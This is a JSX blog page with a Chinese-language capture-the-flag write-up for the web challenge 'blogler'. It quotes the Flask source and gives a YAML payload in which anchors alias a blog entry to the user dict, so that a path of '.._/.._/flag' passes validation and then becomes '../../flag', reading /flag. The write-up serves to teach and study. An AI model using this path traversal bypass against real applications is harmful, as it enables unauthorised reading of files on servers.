import X from 'src/component/X';

export default function Post() {
    return (
        <>
            <X.H1>Web/blogler</X.H1>
            <X.P>题目允许上传新博客，或直接编辑YAML格式的配置文件：</X.P>
            <X.Image src="1.jpg" width="100%" />
            <X.CodeBlock
                language="python"
                code={String.raw`
                def display_name(username: str) -> str:
                    return "".join(p.capitalize() for p in username.split("_"))


                def validate_conf(old_cfg: dict, uploaded_conf: str) -> dict | str:
                    try:
                        conf = yaml.safe_load(uploaded_conf)

                        # validate all blog entries
                        for i, blog in enumerate(conf["blogs"]):
                            if not isinstance(blog.get("title"), str):
                                return f"please provide a 'title' to the {i + 1}th blog"

                            # no lfi
                            file_name = blog["name"]
                            assert isinstance(file_name, str)
                            file_path = (blog_path / file_name).resolve()
                            if "../" in file_name or file_name.startswith("/") or not file_path.is_relative_to(blog_path):
                                return f"file path {file_name!r} is a hacking attempt. this incident will be reported"

                        # recover from missing display name/passwords with sane default of old one
                        if not isinstance(conf.get("user"), dict):
                            conf["user"] = dict()

                        conf["user"]["name"] = display_name(conf["user"].get("name", old_cfg["user"]["name"]))
                        conf["user"]["password"] = conf["user"].get("password", old_cfg["user"]["password"])
                        if not isinstance(conf["user"]["password"], str):
                            return "provide a valid password bro"
                        return conf
                    except Exception as e:
                        return f"exception - {e}"


                @app.post("/config")
                def update_config():
                    config = request.form.get("config")
                    if config is None:
                        return "give a config..."
                    if "username" not in session:
                        return redirect("/login")

                    validated_config = validate_conf(users[session["username"]], config)

                    # this means there was an error in validation - return err string
                    if isinstance(validated_config, str):
                        return validated_config, 400

                    # update the user conf if it is valid
                    users[session["username"]] = validated_config

                    return redirect("/")


                @app.get("/blog/<string:username>")
                def serve_blog(username):
                    if username not in users:
                        return "username does not exist", 404
                    blogs = [
                        {"title": blog["title"], "content": mistune.html((blog_path / blog["name"]).read_text())}
                        for blog in users[username]["blogs"]
                    ]
                    return render_template("blog.html", blogs=blogs, name=users[username]["user"]["name"])
                `}
            />
            <X.P>本题的需要读取`/flag`中的flag，需要利用`blog["name"]`触发`(blog_path / blog["name"]).read_text()`的LFI漏洞。</X.P>
            <X.P>通过`update_config`更新的YAML配置会经过`validate_conf`的检查，直接在`blog["name"]`中使用`../`会被拒绝；本题切入点是，注意到`blog`（`conf["blogs"][i]`）和`conf["user"]`都包含`name`字段，且`validate_conf`在验证过`blog["name"]`后，会通过`display_name`函数删除`conf["user"]["name"]`中的下划线：</X.P>
            <X.CodeBlock
                language="python"
                highlightLines="10-15,21"
                code={String.raw`
                def validate_conf(old_cfg: dict, uploaded_conf: str) -> dict | str:
                    try:
                        conf = yaml.safe_load(uploaded_conf)

                        # validate all blog entries
                        for i, blog in enumerate(conf["blogs"]):
                            if not isinstance(blog.get("title"), str):
                                return f"please provide a 'title' to the {i + 1}th blog"

                            # no lfi
                            file_name = blog["name"]
                            assert isinstance(file_name, str)
                            file_path = (blog_path / file_name).resolve()
                            if "../" in file_name or file_name.startswith("/") or not file_path.is_relative_to(blog_path):
                                return f"file path {file_name!r} is a hacking attempt. this incident will be reported"

                        # recover from missing display name/passwords with sane default of old one
                        if not isinstance(conf.get("user"), dict):
                            conf["user"] = dict()

                        conf["user"]["name"] = display_name(conf["user"].get("name", old_cfg["user"]["name"]))
                        conf["user"]["password"] = conf["user"].get("password", old_cfg["user"]["password"])
                        if not isinstance(conf["user"]["password"], str):
                            return "provide a valid password bro"
                        return conf
                    except Exception as e:
                        return f"exception - {e}"
                `}
            />
            <X.P>利用YAML的@别名[https://yaml.org/spec/1.2.2/#71-alias-nodes]@功能，可以使得`conf["blogs"][0]`和`conf["user"]`在解析后指向同一个字典对象：</X.P>
            <X.CodeBlock
                language="text"
                highlightLines="2-5,8"
                code={String.raw`
                blogs:
                - &id001
                  name: .._/.._/flag
                  password: abc
                  title: Blog Title
                - name: abc_blog_3e2256dc5fcaedb0.md
                  title: Blog Title
                user: *id001
                `}
            />
            <X.P>此时先验证`blog["name"]`时`.._/.._/flag`能够通过验证，随后该属性又在`display_name`处理后被修改为`../../flag`，从而实现LFI。</X.P>
            <X.Image src="2.jpg" width="100%" />
        </>
    );
}
